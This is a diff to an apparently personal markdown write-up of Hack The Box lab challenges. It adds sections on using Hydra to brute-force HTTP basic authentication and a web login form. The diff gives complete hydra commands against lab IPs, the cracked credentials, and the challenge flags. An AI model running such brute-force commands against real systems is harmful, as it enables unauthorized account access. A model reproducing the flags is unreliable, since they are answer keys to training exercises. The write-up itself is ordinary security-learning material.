@@ -4,6 +4,9 @@
 1. [Brute Force Attacks](#brute-force-attacks)
     1. [Brute Force Attacks](#brute-force-attacks-1)
     2. [Dictionary Attacks](#dictionary-attacks)
+2. [Hydra](#hydra)
+    1. [Basic HTTP Authentication](#basic-http-authentication)
+    2. [Login Forms](#login-forms)
 
 ## Brute Force Attacks
 ### Brute Force Attacks
@@ -104,3 +107,26 @@
     ![alt text](<Assets/Dictionary Attacks - 1.png>)
 
     The answer is `HTB{Brut3_F0rc3_M4st3r}`.
+
+## Hydra
+### Basic HTTP Authentication
+#### Challenges
+1. After successfully brute-forcing, and then logging into the target, what is the full flag you find?
+
+    We can use hydra to solve this.
+
+    ```bash
+    hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 94.237.63.174 http-get / -s 37753
+    ```
+    Then we will get this credential, `basic-auth-user:Password@123`. We can use that to login from firefox. The answer is `HTB{th1s_1s_4_f4k3_fl4g}`.
+
+### Login Forms
+#### Challenges
+1. After successfully brute-forcing, and then logging into the target, what is the full flag you find?
+
+    Firs, we need to make sure what is invalid login response. In this case, `Invalid credentials` is the response. So we can use hydra with that condition.
+
+    ```bash
+    hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 94.237.63.174 -s 40173 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
+    ```
+    We will found this credential, `admin:zxcvbnm`. The answer is `HTB{W3b_L0gin_Brut3F0rc3}`.
